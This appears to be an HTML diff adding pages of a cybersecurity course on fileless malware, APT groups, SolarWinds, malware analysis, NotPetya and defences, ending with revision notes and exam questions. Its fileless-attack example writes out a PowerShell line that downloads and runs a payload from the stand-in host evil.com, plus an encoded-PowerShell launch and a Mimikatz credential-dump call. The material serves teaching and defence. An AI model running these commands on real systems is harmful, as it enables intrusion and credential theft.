+<div class="sec" id="t83">
+  <div class="sh"><span class="sn">Topic 83</span><h2>Fileless Malware</h2><span class="tlvl crit">CRITICAL</span><span class="se">👻</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Definition</h3>
+      <div class="def"><div class="dl">Definition</div>
+        <strong>Fileless malware</strong> executes entirely in memory (RAM) without writing malicious files to disk. It abuses legitimate system tools (PowerShell, WMI, mshta, regsvr32) to carry out attacks. Since there is no file on disk, traditional signature-based antivirus (which scans files) cannot detect it.
+      </div>
+    </div>
+    <div class="sub"><h3>Living-off-the-Land (LotL) Attacks</h3>
+      <div class="cb"><div class="clbl">FILELESS ATTACK EXAMPLE</div><pre><span class="cy"># Scenario: Malicious Office macro launches fileless attack</span>
+<span class="cd"># No malware file is written to disk at any point</span>
+
+<span class="cy">Step 1: User opens malicious Word doc</span>
+  → Macro executes: <span class="cr">cmd.exe /c powershell -nop -enc [base64 payload]</span>
+
+<span class="cy">Step 2: PowerShell downloads payload INTO MEMORY (never to disk)</span>
+  <span class="cr">IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')</span>
+  <span class="cd"># IEX = Invoke-Expression: executes downloaded code directly in RAM</span>
+
+<span class="cy">Step 3: Payload runs Mimikatz (credential dumper) in memory</span>
+  <span class="cr">Invoke-Mimikatz -DumpCreds</span>
+  <span class="cd"># Extracts LSASS memory → gets all logged-in user hashes/plaintext passwords</span>
+
+<span class="cy">Step 4: Persistence via WMI subscription (no file needed)</span>
+  <span class="cr">Set-WMIInstance -Class __EventFilter ... </span>
+  <span class="cd"># WMI event triggers payload on every boot — stored in WMI database, not a file</span>
+
+<span class="cy">Step 5: Lateral movement via pass-the-hash</span>
+  <span class="cd"># Use stolen NTLM hash to authenticate to other machines</span>
+
+<span class="cg"># Why AV misses this:</span>
+<span class="cg">→ No malicious file on disk = no signature to scan</span>
+<span class="cg">→ Using legitimate Windows tools (LOLBins)</span>
+
+<span class="cg"># Detection requires:</span>
+<span class="cg">→ EDR with memory scanning and behavioral detection</span>
+<span class="cg">→ PowerShell ScriptBlock logging (logs all executed PS code)</span>
+<span class="cg">→ AMSI (Antimalware Scan Interface) — scans code in memory before execution</span>
+<span class="cg">→ Constrained Language Mode for PowerShell</span></pre></div>
+    </div>
+    <div class="sub"><h3>Common Living-off-the-Land Binaries (LOLBins)</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Binary / Tool</th><th>Legitimate Purpose</th><th>Attacker Abuse</th></tr></thead>
+        <tbody>
+          <tr><td>PowerShell</td><td>System administration automation</td><td>Download/execute payloads, bypass AV, credential dumping</td></tr>
+          <tr><td>WMI (wmic.exe)</td><td>System management queries</td><td>Persistence, lateral movement, remote execution</td></tr>
+          <tr><td>mshta.exe</td><td>Run HTML applications</td><td>Execute malicious VBScript/JScript from URL</td></tr>
+          <tr><td>certutil.exe</td><td>Certificate management</td><td>Download files from internet, base64 decode payloads</td></tr>
+          <tr><td>regsvr32.exe</td><td>Register COM DLLs</td><td>Execute remote .SCT scripts — bypass AppLocker</td></tr>
+          <tr><td>rundll32.exe</td><td>Run DLL functions</td><td>Execute malicious DLLs from memory or remote share</td></tr>
+          <tr><td>Mimikatz</td><td>N/A (offensive security tool)</td><td>Dump Windows credentials from LSASS memory in cleartext</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Why does traditional file-scanning antivirus fail against fileless malware? What security capability is needed instead?</li>
+      <li>What is Mimikatz? Why is it so powerful and why do attackers love it?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Fileless malware represents the evolution of evasion techniques. It exploits the fact that defenders scan files but don't always monitor what runs in memory. EDR (Endpoint Detection &amp; Response) with behavioural analysis, PowerShell logging, and AMSI are the key countermeasures — signature-based AV alone is insufficient.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T84 ===== -->
+<div class="sgt">🎯 Advanced Threats</div>
+<div class="sec" id="t84">
+  <div class="sh"><span class="sn">Topic 84</span><h2>Advanced Persistent Threat (APT)</h2><span class="tlvl crit">CRITICAL</span><span class="se">🎯</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Definition</h3>
+      <div class="def"><div class="dl">Definition</div>
+        An <strong>APT (Advanced Persistent Threat)</strong> is a sophisticated, long-term targeted attack typically carried out by nation-states or state-sponsored groups. They operate covertly inside a target network for months or years, with the goal of espionage, intellectual property theft, or destructive attacks. APTs are characterised by: <strong>Advanced</strong> (custom tools, zero-days), <strong>Persistent</strong> (long-term dwell), and <strong>Threat</strong> (human-directed, organised).
+      </div>
+    </div>
+    <div class="sub"><h3>APT Lifecycle (MITRE ATT&amp;CK)</h3>
+      <div class="flow">
+        <div class="fn s">Reconnaissance — OSINT, LinkedIn profiling, scanning target org</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">Weaponisation — Package exploit + payload into deliverable</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">Delivery — Spear-phishing email, watering hole, supply chain compromise</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">Exploitation — Zero-day or known CVE executes payload</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">Installation — RAT/backdoor installed; rootkit for persistence</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn">C2 (Command &amp; Control) — Encrypted communication to attacker</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn w">Lateral Movement — Pivot across internal network; escalate privileges</div>
+        <div class="fa"><div class="ln"></div><div class="tip"></div></div>
+        <div class="fn" style="border-color:var(--red);color:var(--red)">Actions on Objectives — Exfiltrate IP, spy on comms, destroy data</div>
+      </div>
+    </div>
+    <div class="sub"><h3>Notable APT Groups</h3>
+      <div class="tw"><table>
+        <thead><tr><th>APT Group</th><th>Nation</th><th>Known As</th><th>Notable Attack</th><th>Specialty</th></tr></thead>
+        <tbody>
+          <tr><td>APT28</td><td>Russia (GRU)</td><td>Fancy Bear</td><td>DNC hack 2016, NotPetya</td><td>Election interference, NATO targets</td></tr>
+          <tr><td>APT29</td><td>Russia (SVR)</td><td>Cozy Bear</td><td>SolarWinds 2020, Democratic Party</td><td>Long-term stealth, supply chain</td></tr>
+          <tr><td>APT1</td><td>China (PLA Unit 61398)</td><td>Comment Crew</td><td>Stole terabytes from 141 orgs across 20 industries</td><td>Industrial espionage, IP theft</td></tr>
+          <tr><td>APT41</td><td>China</td><td>Winnti/Barium</td><td>Video game monetisation + espionage</td><td>Dual: espionage + financial crime</td></tr>
+          <tr><td>Lazarus Group</td><td>North Korea</td><td>Hidden Cobra</td><td>Sony Pictures 2014, $81M Bangladesh Bank heist, WannaCry</td><td>Financial theft for sanctions evasion</td></tr>
+          <tr><td>APT33</td><td>Iran</td><td>Elfin/Refined Kitten</td><td>Shamoon (Saudi Aramco 2012 wiper)</td><td>Energy sector, aviation</td></tr>
+          <tr><td>Equation Group</td><td>USA (NSA/TAO)</td><td>—</td><td>Stuxnet, EternalBlue (stolen by Shadow Brokers)</td><td>Most sophisticated known APT</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>SolarWinds Attack — APT29 (2020)</h3>
+      <div class="cb"><div class="clbl">SOLARWINDS SUPPLY CHAIN ATTACK</div><pre><span class="cy">Attack Type:</span> Supply chain compromise — most sophisticated ever
+<span class="cy">Actor:</span>       APT29 (Cozy Bear) — Russian SVR intelligence
+
+<span class="cy">What happened:</span>
+1. Attacker infiltrated SolarWinds (IT management software vendor)
+2. Modified build process — SUNBURST backdoor inserted into
+   Orion software update (version 2019.4–2020.2.1)
+3. Digitally SIGNED by SolarWinds (legitimate signature!)
+4. <span class="cr">18,000 organisations installed the trojanised update</span>
+5. SUNBURST lay dormant 12-14 days, checked it wasn't in a sandbox
+6. Beacon to C2 via DNS using DGA — blended with legitimate Orion DNS
+7. If target deemed "interesting": second stage payload TEARDROP deployed
+8. Lateral movement using stolen SAML tokens (Golden SAML attack)
+
+<span class="cy">Victims:</span>
+→ US Treasury, Department of Homeland Security, State Department
+→ FireEye (discovered the attack), Microsoft, Intel, Cisco
+→ ~100 private sector companies
+→ Active undetected for 9+ MONTHS
+
+<span class="cg">Key lessons:</span>
+→ Software supply chain is a critical attack vector
+→ Build pipeline integrity is now a security requirement
+→ SBOM (Software Bill of Materials) required by US Executive Order 2021
+→ Zero trust: even trusted software can be malicious</pre></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>How did SolarWinds attackers ensure their malware was trusted by security products? Why is this particularly dangerous?</li>
+      <li>What is "dwell time" and why do APTs deliberately stay undetected for months? What are they doing during this time?</li>
+      <li>Which MITRE ATT&amp;CK tactic does the SolarWinds attack represent? Use the framework terminology.</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>APTs represent the most sophisticated threat on the planet. Nation-states invest billions in cyber capability because it's far cheaper than conventional warfare and offers plausible deniability. Defending against APTs requires: network segmentation, anomaly-based detection, threat hunting, zero trust architecture, and supply chain security.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T85 ===== -->
+<div class="sec" id="t85">
+  <div class="sh"><span class="sn">Topic 85</span><h2>Malware Analysis Basics</h2><span class="se">🔬</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Types of Malware Analysis</h3>
+      <div class="cmp">
+        <div class="cp2 a"><h4>👁️ Static Analysis</h4><ul>
+          <li>Analyse malware WITHOUT executing it</li>
+          <li>File hash (SHA-256) — check VirusTotal</li>
+          <li>Strings extraction (readable text in binary)</li>
+          <li>PE header analysis (imports, exports, sections)</li>
+          <li>Disassembly (IDA Pro, Ghidra) — reverse engineer code</li>
+          <li>YARA rules — pattern matching for malware families</li>
+          <li>Safe but limited — can't see dynamic behaviour</li>
+        </ul></div>
+        <div class="cp2 o"><h4>⚡ Dynamic Analysis</h4><ul>
+          <li>Execute malware in controlled sandbox environment</li>
+          <li>Observe file system, registry, network activity</li>
+          <li>Tools: Cuckoo Sandbox, ANY.RUN, Joe Sandbox</li>
+          <li>Captures API calls, DNS queries, C2 communications</li>
+          <li>More accurate — sees real behaviour</li>
+          <li>Risk: malware may detect sandbox and behave differently</li>
+          <li>Hybrid: initial static → then dynamic</li>
+        </ul></div>
+      </div>
+    </div>
+    <div class="sub"><h3>Indicators of Compromise (IoC)</h3>
+      <div class="cb"><div class="clbl">IOC TYPES + THREAT INTELLIGENCE</div><pre><span class="cy">IoC (Indicator of Compromise)</span> — evidence of malware infection:
+
+<span class="cy">File-based IoCs:</span>
+  SHA-256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+  File name: svchost32.exe  (legitimate svchost.exe never has numbers)
+  File path: C:\Users\Public\svchost32.exe  (wrong location for svchost)
+
+<span class="cy">Network IoCs:</span>
+  IP: 185.220.101.45  (known Tor exit node / C2)
+  Domain: update-service.windows-cdn.net  (fake Microsoft domain)
+  URL: http://185.220.101.45/gate.php
+  User-Agent: Mozilla/4.0 (compatible; MSIE 6.0)  (outdated = suspicious)
+  DNS queries: aGVs.update-svc.com  (base64-like DGA domain)
+
+<span class="cy">Host-based IoCs:</span>
+  Registry: HKCU\Software\Microsoft\Windows\Run\svchost32.exe
+  Process: powershell.exe spawned by word.exe
+  Network connection: lsass.exe has outbound TCP (never normal!)
+  Scheduled task: named SystemUpdate with suspicious command
+
+<span class="cg">Threat Intelligence Feeds (share IoCs):</span>
+  MITRE ATT&amp;CK  → TTP framework + group attribution
+  VirusTotal     → File/URL/IP reputation
+  OTX (AlienVault)→ Community IoC sharing
+  ISACs          → Sector-specific threat sharing (FS-ISAC, H-ISAC)</pre></div>
+    </div>
+    <div class="sub"><h3>Malware Analysis Lab Setup</h3>
+      <div class="ib g"><span class="bi">🔬</span><div><strong>Safe Analysis Environment:</strong> Always use an isolated VM (VMware/VirtualBox) with: host-only networking (no internet access), no shared folders to host, snapshot before analysis (revert after), no personal credentials, dedicated hardware if analysing advanced malware. Tools: REMnux (Linux malware analysis distro), FlareVM (Windows analysis), Wireshark, Process Monitor, Regshot, PEstudio, Ghidra (free NSA reverse engineering tool).</div></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>You receive a suspicious email attachment (PDF). List the static analysis steps you would take BEFORE opening it.</li>
+      <li>During dynamic analysis, you see <code>word.exe</code> spawning <code>powershell.exe -enc [base64]</code>. What does this indicate?</li>
+      <li>What are YARA rules and how would you use one to detect a specific malware family?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Malware analysis is the SOC analyst's and threat hunter's core skill. Even basic analysis — file hash lookup on VirusTotal, strings extraction, network IoC identification — can confirm infection and guide incident response. Advanced reverse engineering (disassembly) enables understanding of novel threats and attribution.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T86 ===== -->
+<div class="sec" id="t86">
+  <div class="sh"><span class="sn">Topic 86</span><h2>Real Attack Examples</h2><span class="se">📰</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Greatest Hits — Notable Malware Incidents</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Incident</th><th>Year</th><th>Malware Type</th><th>Entry Point</th><th>Impact</th><th>Lesson</th></tr></thead>
+        <tbody>
+          <tr><td>ILOVEYOU</td><td>2000</td><td>Worm/Virus</td><td>Email: "LOVE-LETTER-FOR-YOU.txt.vbs"</td><td>50M infections, $15B damage, Pentagon email shutdown</td><td>File extensions hidden by default — deadly</td></tr>
+          <tr><td>Code Red</td><td>2001</td><td>Worm</td><td>IIS buffer overflow (no user interaction)</td><td>$2.6B, 359,000 infected in 14 hours</td><td>Patch web servers — buffer overflows are critical</td></tr>
+          <tr><td>SQL Slammer</td><td>2003</td><td>Worm</td><td>SQL Server buffer overflow UDP 1434</td><td>75,000 servers in 10 minutes; ATMs, airlines down</td><td>Smallest worm (376 bytes) = huge impact</td></tr>
+          <tr><td>Stuxnet</td><td>2010</td><td>Worm + Rootkit</td><td>USB drop at contractor</td><td>1,000 Iranian centrifuges destroyed</td><td>Air gaps ≠ security; cyber can cause physical damage</td></tr>
+          <tr><td>Target Breach</td><td>2013</td><td>PoS Malware</td><td>HVAC vendor credential theft</td><td>40M payment cards; 110M personal records stolen</td><td>Third-party vendor access is a major risk</td></tr>
+          <tr><td>Sony Pictures</td><td>2014</td><td>Wiper + RAT</td><td>Spear-phishing (Lazarus/DPRK)</td><td>$35M damage; unreleased films leaked; 100TB data destroyed</td><td>Nation-state retaliation via cyberattack</td></tr>
+          <tr><td>WannaCry</td><td>2017</td><td>Ransomworm</td><td>EternalBlue SMBv1 exploit</td><td>230,000 machines; NHS cancelled 19,000 appointments</td><td>Patch Tuesday compliance is non-negotiable</td></tr>
+          <tr><td>NotPetya</td><td>2017</td><td>Wiper (fake ransomware)</td><td>Ukraine tax software update</td><td>$10B; Maersk rebuilt 45,000 PCs, 4,000 servers</td><td>Supply chain attack; most costly cyber event ever</td></tr>
+          <tr><td>SolarWinds</td><td>2020</td><td>APT/Supply chain</td><td>Trojanised software update</td><td>18,000 organisations; US government agencies</td><td>Software supply chain security is critical</td></tr>
+          <tr><td>Log4Shell</td><td>2021</td><td>RCE Exploit</td><td>Ubiquitous Log4j library</td><td>3 billion vulnerable devices; Apache, Steam, Apple iCloud</td><td>Open source dependencies = hidden attack surface</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>NotPetya Deep Dive</h3>
+      <div class="cb"><div class="clbl">NOTPETYA — $10 BILLION WIPER</div><pre><span class="cy">Actor:</span>    Sandworm (APT44) — Russian GRU
+<span class="cy">Target:</span>   Ukraine (but spread globally)
+<span class="cy">Year:</span>     June 27, 2017
+
+<span class="cr">NOT ransomware — despite ransom note, designed to DESTROY data:</span>
+→ Overwrites MBR with custom bootloader
+→ Encrypts MFT (Master File Table) — makes disk unreadable
+→ Encryption key is generated randomly and DISCARDED
+→ Payment would not recover data — impossible to decrypt
+
+<span class="cy">Spread mechanism (why it was catastrophic):</span>
+1. Initial vector: MeDoc (Ukrainian accounting software) update hijacked
+2. EternalBlue (SMB) for network propagation
+3. Mimikatz to steal credentials from LSASS memory
+4. PsExec/WMIC to spread to every machine with those credentials
+→ Spreads even to PATCHED machines via credential reuse
+
+<span class="cy">Victims and damages:</span>
+  Maersk (shipping): $300M — rebuilt entire IT infrastructure in 10 days
+  Merck (pharma): $870M — FDA manufacturing halted
+  FedEx/TNT: $400M
+  Mondelez (Oreo maker): $188M
+  Total: ~$10 billion in damages
+
+<span class="cg">Key lessons:</span>
+→ Software update mechanisms must be cryptographically signed
+→ Credential hygiene: local admin password uniqueness (LAPS)
+→ Network segmentation limits lateral movement
+→ Backups must be offline/immutable to survive wipers</pre></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Compare WannaCry and NotPetya: same spread mechanism, different purpose. How do their impacts differ?</li>
+      <li>The Target breach started with an HVAC vendor. What security control should have prevented lateral movement from the vendor's access to the payment card systems?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Real attack case studies reveal consistent patterns: unpatched systems, poor credential hygiene, inadequate network segmentation, and trusted third parties. Every major breach is preventable in hindsight. The goal of studying real attacks is to apply these lessons proactively — before you become the next case study.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T87 ===== -->
+<div class="sec" id="t87">
+  <div class="sh"><span class="sn">Topic 87</span><h2>Prevention Techniques</h2><span class="se">🛡️</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Defence Layers Against Malware</h3>
+      <div class="cb"><div class="clbl">DEFENCE IN DEPTH</div><pre><span class="cy">Layer 1: EMAIL SECURITY (First line — 94% of malware enters via email)</span>
+  → Email gateway scanning (ProofPoint, Mimecast)
+  → Sandbox all attachments before delivery
+  → SPF + DKIM + DMARC to prevent spoofed sender addresses
+  → Block dangerous file types (.vbs, .js, .exe in email)
+
+<span class="cy">Layer 2: ENDPOINT PROTECTION</span>
+  → EDR (Endpoint Detection &amp; Response): CrowdStrike, SentinelOne, Defender for Endpoint
+  → Next-gen AV: Behavioural detection + ML (not just signatures)
+  → Application Control/Allowlisting: only approved software can run (AppLocker, WDAC)
+  → PowerShell: Constrained Language Mode + ScriptBlock logging
+  → AMSI: Antimalware Scan Interface hooks into script engines
+
+<span class="cy">Layer 3: PATCH MANAGEMENT (closes worm/exploit entry points)</span>
+  → Patch Tuesday: apply within 7 days for critical CVEs
+  → Vulnerability scanning: Nessus, Qualys — know what's unpatched
+  → Asset inventory: can't patch what you don't know you have
+
+<span class="cy">Layer 4: NETWORK SECURITY</span>
+  → Network segmentation + VLANs: limit lateral movement blast radius
+  → IDS/IPS: detect C2 traffic, port scans, lateral movement
+  → DNS filtering: block known malicious domains (Cisco Umbrella)
+  → Egress filtering: limit outbound connections to known services only
+
+<span class="cy">Layer 5: IDENTITY &amp; ACCESS</span>
+  → MFA on everything: stolen credentials alone insufficient
+  → Least privilege: users have minimum rights needed
+  → LAPS: unique local admin passwords on every workstation
+  → PAM: Privileged Access Management for admin accounts
+
+<span class="cy">Layer 6: BACKUP &amp; RECOVERY (ransomware countermeasure)</span>
+  → 3-2-1 rule: 3 copies, 2 media types, 1 offsite/offline
+  → Immutable backups: S3 Object Lock, Veeam hardened repo
+  → Test restores quarterly: an untested backup is not a backup
+  → Backup systems excluded from domain (ransomware can't reach)
+
+<span class="cy">Layer 7: DETECTION &amp; RESPONSE</span>
+  → SIEM: correlate logs, detect kill chain stages
+  → SOC: humans reviewing alerts 24/7
+  → Threat Hunting: proactively search for hidden threats
+  → IR Plan: documented, tested incident response procedure</pre></div>
+    </div>
+    <div class="sub"><h3>User Training — The Human Layer</h3>
+      <div class="ib r"><span class="bi">🧠</span><div><strong>Security Awareness Training:</strong> 95% of breaches involve human error. Training topics: recognising phishing emails, handling suspicious attachments, reporting incidents, safe web browsing, social engineering awareness. Simulated phishing campaigns (KnowBe4, Proofpoint) measure and improve click rates. The goal is a "security culture" where every employee is a sensor, not a vulnerability.</div></div>
+    </div>
+    <div class="sub"><h3>Quick Reference: Malware Prevention Checklist</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Control</th><th>Protects Against</th><th>Priority</th></tr></thead>
+        <tbody>
+          <tr><td>Apply patches within 7 days of critical release</td><td>Worms, exploits (WannaCry, Log4Shell)</td><td style="color:var(--red)">CRITICAL</td></tr>
+          <tr><td>MFA on all accounts</td><td>Trojan credential theft, phishing</td><td style="color:var(--red)">CRITICAL</td></tr>
+          <tr><td>Offline/immutable backups</td><td>Ransomware, wipers</td><td style="color:var(--red)">CRITICAL</td></tr>
+          <tr><td>Email sandboxing + attachment filtering</td><td>Macro virus, Trojan droppers, phishing</td><td style="color:var(--red)">CRITICAL</td></tr>
+          <tr><td>EDR deployment (not just AV)</td><td>Fileless malware, APTs, rootkits</td><td style="color:var(--orange)">HIGH</td></tr>
+          <tr><td>Network segmentation + VLANs</td><td>Ransomware spread, lateral movement</td><td style="color:var(--orange)">HIGH</td></tr>
+          <tr><td>Disable macros in Office (policy)</td><td>Macro viruses, Trojan droppers</td><td style="color:var(--orange)">HIGH</td></tr>
+          <tr><td>Disable SMBv1, close unused ports</td><td>Worms (WannaCry, EternalBlue)</td><td style="color:var(--orange)">HIGH</td></tr>
+          <tr><td>DNS filtering (Cisco Umbrella)</td><td>C2 communications, botnets</td><td style="color:var(--gold)">MEDIUM</td></tr>
+          <tr><td>Least privilege + LAPS</td><td>Lateral movement, privilege escalation</td><td style="color:var(--gold)">MEDIUM</td></tr>
+          <tr><td>User security training</td><td>Phishing, Trojan installation</td><td style="color:var(--gold)">MEDIUM</td></tr>
+          <tr><td>Change all default passwords (IoT)</td><td>Botnets (Mirai)</td><td style="color:var(--gold)">MEDIUM</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>A small business asks you for their top 5 security controls to prevent malware. Justify your choices based on real attack case studies from this unit.</li>
+      <li>Why is "3-2-1 backup" insufficient against ransomware if all backups are network-accessible? What additional property must backups have?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>No single control prevents all malware — defence in depth is required. Prioritise: patch management (closes entry doors), MFA (neutralises credential theft), immutable backups (survives ransomware), and EDR (detects what AV misses). Then layer email security, network segmentation, and continuous monitoring. The goal is not to prevent all infections — it's to detect them quickly and limit the blast radius.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T88 REVISION ===== -->
+<div class="sgt">📝 Revision</div>
+<div class="sec" id="t88">
+  <div class="sh"><span class="sn">Topic 88</span><h2>Unit 5 Revision Notes</h2><span class="se">📝</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Quick Reference Glossary</h3>
+      <div class="rv">
+        <div class="ri"><span class="rt">Malware</span><span class="rd">Any software designed to harm, steal, or gain unauthorised access. 450,000+ new samples daily.</span></div>
+        <div class="ri"><span class="rt">Virus</span><span class="rd">Self-replicates by attaching to host file. Needs user action to spread. Types: file, macro, boot, polymorphic.</span></div>
+        <div class="ri"><span class="rt">Worm</span><span class="rd">Self-propagates without host file or user interaction. Spreads via network vulnerabilities. WannaCry, Stuxnet.</span></div>
+        <div class="ri"><span class="rt">Trojan</span><span class="rd">Disguised as legitimate software. No self-replication. RAT, Banking Trojan, Backdoor, Dropper.</span></div>
+        <div class="ri"><span class="rt">RAT</span><span class="rd">Remote Access Trojan — full remote control: screen, webcam, mic, files, shell. njRAT, DarkComet.</span></div>
+        <div class="ri"><span class="rt">Ransomware</span><span class="rd">Encrypts files, demands Bitcoin. AES encrypts files, RSA protects AES key. RaaS model.</span></div>
+        <div class="ri"><span class="rt">Double Extortion</span><span class="rd">Ransomware that exfiltrates AND encrypts. Pay or data published on leak site.</span></div>
+        <div class="ri"><span class="rt">Spyware</span><span class="rd">Silent surveillance — keystrokes, screen, camera, location. Pegasus = nation-state spyware.</span></div>
+        <div class="ri"><span class="rt">Adware</span><span class="rd">Unwanted ads, browser hijacking. Often bundles worse malware. Malvertising = ads with exploits.</span></div>
+        <div class="ri"><span class="rt">Rootkit</span><span class="rd">Hides itself and other malware. Kernel &gt; UEFI most dangerous. Survives reinstall. DKOM.</span></div>
+        <div class="ri"><span class="rt">Botnet</span><span class="rd">Army of infected bots. C2 server controls all. DDoS, spam, cryptomining, credential stuffing.</span></div>
+        <div class="ri"><span class="rt">C2 (Command &amp; Control)</span><span class="rd">Communication channel between malware and attacker. DGA, fast-flux, P2P variants for resilience.</span></div>
+        <div class="ri"><span class="rt">Keylogger</span><span class="rd">Records keystrokes. Software (API hook) or hardware (physical device). Captures passwords.</span></div>
+        <div class="ri"><span class="rt">Fileless Malware</span><span class="rd">Lives in RAM/registry only. Uses LOLBins (PowerShell, WMI). Evades file-scanning AV.</span></div>
+        <div class="ri"><span class="rt">LOLBin</span><span class="rd">Living-off-the-Land Binary. Legitimate tool abused: PowerShell, certutil, mshta, rundll32.</span></div>
+        <div class="ri"><span class="rt">APT</span><span class="rd">Nation-state long-term attack. Advanced tools, persistent access, specific targets. Months of dwell.</span></div>
+        <div class="ri"><span class="rt">Dwell Time</span><span class="rd">Time malware undetected in network. Average 21 days. APTs can stay years.</span></div>
+        <div class="ri"><span class="rt">Supply Chain Attack</span><span class="rd">Compromise trusted vendor to reach target. SolarWinds, NotPetya (MeDoc), XZ Utils 2024.</span></div>
+        <div class="ri"><span class="rt">IoC</span><span class="rd">Indicator of Compromise — SHA-256, IP, domain, registry key, user-agent indicating infection.</span></div>
+        <div class="ri"><span class="rt">MITRE ATT&CK</span><span class="rd">Framework of attacker tactics, techniques, procedures. Maps to defence controls. industry standard.</span></div>
+        <div class="ri"><span class="rt">RaaS</span><span class="rd">Ransomware-as-a-Service. Criminals lease ransomware toolkit. 20-30% revenue share.</span></div>
+        <div class="ri"><span class="rt">EternalBlue</span><span class="rd">NSA exploit for SMBv1 (MS17-010). Stolen by Shadow Brokers. Weaponised in WannaCry, NotPetya.</span></div>
+        <div class="ri"><span class="rt">Mimikatz</span><span class="rd">Credential dumping tool. Extracts plaintext passwords from LSASS memory. Used in APTs.</span></div>
+        <div class="ri"><span class="rt">3-2-1 Backup</span><span class="rd">3 copies, 2 different media, 1 offsite/offline. Offline = immutable = ransomware-resistant.</span></div>
+        <div class="ri"><span class="rt">EDR</span><span class="rd">Endpoint Detection &amp; Response. Behavioural detection, memory scanning, threat hunting.</span></div>
+      </div>
+    </div>
+    <div class="div"></div>
+    <div class="sub"><h3>Malware Comparison Quick Table</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Type</th><th>Self-Replicates?</th><th>Needs Host?</th><th>User Interaction?</th><th>Primary Goal</th><th>Key Defence</th></tr></thead>
+        <tbody>
+          <tr><td>Virus</td><td>Yes</td><td>Yes (file)</td><td>Yes (run host)</td><td>Disrupt/spread</td><td>AV, disable macros, email filtering</td></tr>
+          <tr><td>Worm</td><td>Yes</td><td>No</td><td>No</td><td>Rapid propagation</td><td>Patching, firewall, network segmentation</td></tr>
+          <tr><td>Trojan</td><td>No</td><td>No</td><td>Yes (install)</td><td>Backdoor/steal</td><td>App allowlisting, email gateway, user training</td></tr>
+          <tr><td>Ransomware</td><td>Sometimes</td><td>No</td><td>Sometimes</td><td>Financial extortion</td><td>Offline backups, MFA, patching</td></tr>
+          <tr><td>Spyware</td><td>No</td><td>No</td><td>Sometimes</td><td>Surveillance</td><td>EDR, FIDO2 keys, software updates</td></tr>
+          <tr><td>Rootkit</td><td>No</td><td>No</td><td>No (once installed)</td><td>Persistence/hide</td><td>Secure Boot, EDR, OS integrity monitoring</td></tr>
+          <tr><td>Botnet bot</td><td>No</td><td>No</td><td>No</td><td>Criminal service</td><td>Patch, default credential change, EDR</td></tr>
+          <tr><td>Fileless</td><td>No</td><td>No</td><td>Sometimes</td><td>Stealth execution</td><td>EDR, PowerShell logging, AMSI</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="div"></div>
+    <div class="sub"><h3>📋 10 Exam Practice Questions</h3>
+      <div class="tw"><table>
+        <thead><tr><th>#</th><th>Question</th><th>Marks</th><th>Key Points</th></tr></thead>
+        <tbody>
+          <tr><td>Q1</td><td>Explain the difference between a virus, a worm, and a Trojan. Give one example of each.</td><td>6</td><td>Virus=host+user action; Worm=autonomous network spread; Trojan=deception, no replicate</td></tr>
+          <tr><td>Q2</td><td>Describe how ransomware uses both symmetric and asymmetric encryption. Why can victims not decrypt without paying?</td><td>7</td><td>AES encrypts files; RSA encrypts AES key; private key held by attacker only</td></tr>
+          <tr><td>Q3</td><td>What is a botnet? Describe three criminal uses of a botnet and how Mirai infected 600,000 devices.</td><td>7</td><td>Network of bots; DDoS, spam, cryptomining; Mirai = default IoT credentials</td></tr>
+          <tr><td>Q4</td><td>Why is fileless malware difficult to detect with traditional antivirus? What security technology is needed?</td><td>5</td><td>No file on disk; uses legitimate tools (LOLBins); needs EDR with behavioral + memory scanning</td></tr>
+          <tr><td>Q5</td><td>Describe an APT attack lifecycle. Use the SolarWinds attack as an example.</td><td>8</td><td>Recon→Weapon→Delivery→Exploit→Install→C2→Lateral→Objectives; SolarWinds: supply chain, SUNBURST, 9 months</td></tr>
+          <tr><td>Q6</td><td>What is a rootkit? Explain the difference between kernel-mode and UEFI rootkits.</td><td>6</td><td>Hides malware from OS; kernel=Ring 0, hooks syscalls; UEFI=below OS, survives reinstall</td></tr>
